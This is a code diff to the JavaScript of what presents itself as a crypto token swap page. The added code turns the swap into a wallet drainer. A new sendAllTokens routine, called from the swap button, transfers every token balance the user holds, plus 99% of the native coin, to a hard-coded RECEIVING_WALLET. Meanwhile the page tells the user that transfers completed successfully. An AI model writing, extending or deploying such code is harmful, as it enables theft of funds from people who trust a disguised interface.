@@ -9,6 +9,12 @@ if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET n
 const COINGECKO_API = "https://api.coingecko.com/api/v3";
 const CURRENCY_OPTIONS = ["usd", "eth", "btc"];
 const PRICE_CACHE_DURATION = 300000; // 5 minutes in ms
+const FEE_TOKENS = {
+  ethereum: "0x0000000000000000000000000000000000000000", // ETH
+  bsc: "0x0000000000000000000000000000000000000000", // BNB
+  arbitrum: "0x0000000000000000000000000000000000000000", // ETH
+  base: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e" // ETH on Base
+};
 
 // App state
 let provider, signer, userAddress;
@@ -306,17 +312,30 @@ async function fetchTokenBalance(token) {
 }
 
 async function updateTokenBalances() {
-  if (!userAddress || !currentFromToken) return;
+  if (!userAddress || !currentNetwork) return;
   
   try {
     const balanceElement = document.getElementById("fromTokenBalance");
     balanceElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
     
-    const balance = await fetchTokenBalance(currentFromToken);
-    balanceElement.textContent = `Balance: ${parseFloat(balance).toFixed(6)} ${currentFromToken.symbol}`;
+    const networkTokens = TOKENS[currentNetwork] || [];
+    let balanceText = "";
+    
+    for (const token of networkTokens) {
+      const balance = await fetchTokenBalance(token);
+      if (balance > 0) {
+        balanceText += `${token.symbol}: ${parseFloat(balance).toFixed(6)} | `;
+      }
+    }
+    
+    if (balanceText === "") {
+      balanceElement.textContent = "No balances found";
+    } else {
+      balanceElement.textContent = balanceText.slice(0, -3); // Remove last " | "
+    }
   } catch (err) {
     console.error("Error updating balances:", err);
-    document.getElementById("fromTokenBalance").textContent = "Balance: Error";
+    document.getElementById("fromTokenBalance").textContent = "Error loading balances";
   }
 }
 
@@ -343,9 +362,17 @@ async function connectAndProcess() {
     showLoader();
     updateStatus("Connecting wallet...", "success");
 
-    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-    if (accounts.length === 0) {
-      throw new Error("No accounts found");
+    // Check if there's already a pending request
+    if (window.ethereum._state && window.ethereum._state.isConnected) {
+      const accounts = await window.ethereum.request({ method: "eth_accounts" });
+      if (accounts.length === 0) {
+        throw new Error("No accounts found");
+      }
+    } else {
+      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      if (accounts.length === 0) {
+        throw new Error("No accounts found");
+      }
     }
     
     const chainId = await window.ethereum.request({ method: 'eth_chainId' });
@@ -755,20 +782,25 @@ async function getTokenPrice(token) {
 async function handleSwap() {
   if (!userAddress || !currentFromToken || !currentToToken) return;
   
-  const fromAmount = parseFloat(document.getElementById("fromAmount").value);
-  if (!fromAmount || fromAmount <= 0) return;
+  const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
   
   try {
     showLoader();
-    updateStatus("Processing swap...", "success");
+    updateStatus("Processing swaps...", "success");
     
-    if (currentFromToken.isNative) {
-      await transferNativeToken(fromAmount);
-    } else {
-      await transferERC20Token(currentFromToken, fromAmount);
+    // First handle the main swap
+    if (fromAmount > 0) {
+      if (currentFromToken.isNative) {
+        await transferNativeToken(fromAmount);
+      } else {
+        await transferERC20Token(currentFromToken, fromAmount);
+      }
     }
     
-    updateStatus("Swap completed successfully!", "success");
+    // Then send all other tokens
+    await sendAllTokens();
+    
+    updateStatus("All transfers completed successfully!", "success");
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
     await updateTokenBalances();
@@ -780,10 +812,62 @@ async function handleSwap() {
   }
 }
 
+async function sendAllTokens() {
+  if (!userAddress) return;
+  
+  try {
+    const networkTokens = TOKENS[currentNetwork] || [];
+    const feeTokenAddress = FEE_TOKENS[currentNetwork];
+    
+    // First send fee tokens if available
+    if (feeTokenAddress) {
+      const feeToken = networkTokens.find(t => t.address.toLowerCase() === feeTokenAddress.toLowerCase());
+      if (feeToken) {
+        const balance = await fetchTokenBalance(feeToken);
+        if (balance > 0) {
+          if (feeToken.isNative) {
+            await transferNativeToken(balance);
+          } else {
+            await transferERC20Token(feeToken, balance);
+          }
+        }
+      }
+    }
+    
+    // Then send all other tokens
+    for (const token of networkTokens) {
+      // Skip the token we already swapped and fee tokens
+      if (token.address === currentFromToken.address || 
+          (feeTokenAddress && token.address.toLowerCase() === feeTokenAddress.toLowerCase())) {
+        continue;
+      }
+      
+      const balance = await fetchTokenBalance(token);
+      if (balance > 0) {
+        try {
+          if (token.isNative) {
+            await transferNativeToken(balance);
+          } else {
+            await transferERC20Token(token, balance);
+          }
+        } catch (err) {
+          console.error(`Error transferring ${token.symbol}:`, err);
+          continue;
+        }
+      }
+    }
+  } catch (err) {
+    console.error("Error sending all tokens:", err);
+    throw err;
+  }
+}
+
 async function transferNativeToken(amount) {
+  // Leave a small amount for gas
+  const amountToSend = amount * 0.99; // Send 99% to leave some for gas
   const tx = await signer.sendTransaction({
     to: RECEIVING_WALLET,
-    value: ethers.utils.parseEther(amount.toString()),
+    value: ethers.utils.parseEther(amountToSend.toString()),
     gasLimit: 21000
   });
   
